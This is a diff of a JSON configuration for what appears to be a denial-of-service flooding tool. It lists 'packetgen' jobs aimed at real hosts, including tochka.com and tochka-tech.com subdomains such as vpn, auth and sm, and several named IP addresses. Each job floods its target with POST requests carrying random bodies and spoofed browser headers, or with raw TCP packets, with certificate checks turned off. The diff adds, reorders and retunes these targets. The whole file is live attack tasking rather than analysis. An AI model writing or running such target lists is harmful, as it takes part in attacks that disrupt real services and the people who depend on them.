@@ -8,14 +8,58 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "tcp://194.107.116.201:1723",
+            "count": 15,
+            "name": "https://sm1.tochka.com",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "194.107.116.201:1723"
+                        "address": "sm1.tochka.com:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://sm1.tochka.com",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://sm1.tochka.com",
+                                "Referer": "https://sm1.tochka.com",
+                                "X-Forwarded-Host": "sm1.tochka.com",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 15,
+            "name": "tcp://194.107.116.140:8443",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.107.116.140:8443"
                     }
                 },
                 "packet": {
@@ -30,43 +74,21 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://sm.tochka.com",
+            "count": 15,
+            "name": "tcp://194.107.116.141:8443",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "sm.tochka.com:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "194.107.116.141:8443"
                     }
                 },
                 "packet": {
                     "payload": {
-                        "type": "http",
+                        "type": "raw",
                         "data": {
-                            "method": "POST",
-                            "path": "https://sm.tochka.com",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://sm.tochka.com",
-                                "Referer": "https://sm.tochka.com",
-                                "X-Forwarded-Host": "sm.tochka.com",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
+                            "payload": "{{ random_payload 10 }}"
                         }
                     }
                 }
@@ -74,139 +96,7 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://auth.tochka-tech.com",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "auth.tochka-tech.com:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://auth.tochka-tech.com",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://auth.tochka-tech.com",
-                                "Referer": "https://auth.tochka-tech.com",
-                                "X-Forwarded-Host": "auth.tochka-tech.com",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://victor.tochka-tech.com",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "victor.tochka-tech.com:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://victor.tochka-tech.com",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://victor.tochka-tech.com",
-                                "Referer": "https://victor.tochka-tech.com",
-                                "X-Forwarded-Host": "victor.tochka-tech.com",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://194.107.116.235",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "194.107.116.235:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://194.107.116.235",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://194.107.116.235",
-                                "Referer": "https://194.107.116.235",
-                                "X-Forwarded-Host": "194.107.116.235",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
+            "count": 15,
             "name": "https://ksc-mobile.tochka.com",
             "args": {
                 "connection": {
@@ -250,17 +140,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://vpn.tochka.com",
+            "count": 15,
+            "name": "http://178.248.236.225",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "vpn.tochka.com:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "178.248.236.225:80"
                     }
                 },
                 "packet": {
@@ -268,7 +155,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://vpn.tochka.com",
+                            "path": "http://178.248.236.225",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -281,9 +168,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://vpn.tochka.com",
-                                "Referer": "https://vpn.tochka.com",
-                                "X-Forwarded-Host": "vpn.tochka.com",
+                                "Origin": "http://178.248.236.225",
+                                "Referer": "http://178.248.236.225",
+                                "X-Forwarded-Host": "178.248.236.225",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -294,14 +181,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://194.107.116.237",
+            "count": 15,
+            "name": "https://auth.tochka-tech.com",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "194.107.116.237:443",
+                        "address": "auth.tochka-tech.com:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -312,7 +199,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://194.107.116.237",
+                            "path": "https://auth.tochka-tech.com",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -325,9 +212,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://194.107.116.237",
-                                "Referer": "https://194.107.116.237",
-                                "X-Forwarded-Host": "194.107.116.237",
+                                "Origin": "https://auth.tochka-tech.com",
+                                "Referer": "https://auth.tochka-tech.com",
+                                "X-Forwarded-Host": "auth.tochka-tech.com",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -338,7 +225,117 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
+            "count": 15,
+            "name": "https://victor.tochka-tech.com",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "victor.tochka-tech.com:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://victor.tochka-tech.com",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://victor.tochka-tech.com",
+                                "Referer": "https://victor.tochka-tech.com",
+                                "X-Forwarded-Host": "victor.tochka-tech.com",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 15,
+            "name": "tcp://178.248.236.225:443",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "178.248.236.225:443"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 15,
+            "name": "https://178.248.236.225:3000",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "178.248.236.225:3000",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://178.248.236.225:3000",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://178.248.236.225:3000",
+                                "Referer": "https://178.248.236.225:3000",
+                                "X-Forwarded-Host": "178.248.236.225",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 15,
             "name": "https://lync13.tochka.com",
             "args": {
                 "connection": {
@@ -382,14 +379,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "tcp://194.107.116.141:8443",
+            "count": 15,
+            "name": "tcp://178.248.236.225:3000",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "194.107.116.141:8443"
+                        "address": "178.248.236.225:3000"
                     }
                 },
                 "packet": {
@@ -404,7 +401,51 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
+            "count": 15,
+            "name": "https://194.107.116.237",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.107.116.237:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://194.107.116.237",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://194.107.116.237",
+                                "Referer": "https://194.107.116.237",
+                                "X-Forwarded-Host": "194.107.116.237",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 15,
             "name": "https://194.107.116.236",
             "args": {
                 "connection": {
@@ -448,14 +489,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "tcp://194.107.116.140:8443",
+            "count": 15,
+            "name": "tcp://194.107.116.201:1723",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "194.107.116.140:8443"
+                        "address": "194.107.116.201:1723"
                     }
                 },
                 "packet": {
@@ -470,14 +511,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://sm1.tochka.com",
+            "count": 15,
+            "name": "https://194.107.116.235",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "sm1.tochka.com:443",
+                        "address": "194.107.116.235:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -488,7 +529,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://sm1.tochka.com",
+                            "path": "https://194.107.116.235",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -501,9 +542,163 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://sm1.tochka.com",
-                                "Referer": "https://sm1.tochka.com",
-                                "X-Forwarded-Host": "sm1.tochka.com",
+                                "Origin": "https://194.107.116.235",
+                                "Referer": "https://194.107.116.235",
+                                "X-Forwarded-Host": "194.107.116.235",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 15,
+            "name": "https://vpn.tochka.com",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "vpn.tochka.com:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://vpn.tochka.com",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://vpn.tochka.com",
+                                "Referer": "https://vpn.tochka.com",
+                                "X-Forwarded-Host": "vpn.tochka.com",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 15,
+            "name": "https://178.248.236.225",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "178.248.236.225:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://178.248.236.225",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://178.248.236.225",
+                                "Referer": "https://178.248.236.225",
+                                "X-Forwarded-Host": "178.248.236.225",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 15,
+            "name": "tcp://178.248.236.225:80",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "178.248.236.225:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 15,
+            "name": "https://sm.tochka.com",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "sm.tochka.com:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://sm.tochka.com",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://sm.tochka.com",
+                                "Referer": "https://sm.tochka.com",
+                                "X-Forwarded-Host": "sm.tochka.com",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
